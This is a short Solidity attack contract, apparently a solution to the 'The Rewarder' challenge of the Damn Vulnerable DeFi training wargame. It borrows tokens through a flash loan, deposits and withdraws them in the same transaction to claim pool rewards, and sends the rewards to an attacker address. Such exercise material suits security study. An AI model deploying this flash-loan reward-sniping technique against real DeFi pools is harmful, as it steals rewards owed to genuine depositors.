// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./FlashLoanerPool.sol";
import "./RewardToken.sol";
import "./TheRewarderPool.sol";

contract AttackContract3 {

    DamnValuableToken liquidityToken;

    FlashLoanerPool flashLoanPool;
    RewardToken rewardToken;
    TheRewarderPool rewarderPool;

    address attacker;

    constructor(
        address _liquidityToken,
        address _flashLoanPool,
        address _rewardToken,
        address _rewarderPool,
        address _attacker
    ) {
        liquidityToken = DamnValuableToken(_liquidityToken);
        flashLoanPool = FlashLoanerPool(_flashLoanPool);
        rewardToken = RewardToken(_rewardToken);
        rewarderPool = TheRewarderPool(_rewarderPool);
        attacker = _attacker;
    }

    function receiveFlashLoan(uint256 amount) public {
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        rewardToken.transfer(attacker, rewardToken.balanceOf(address(this)));
        liquidityToken.transfer(address(flashLoanPool), amount);
    }

    function attack(uint256 amount) public {
        flashLoanPool.flashLoan(amount);
    }
}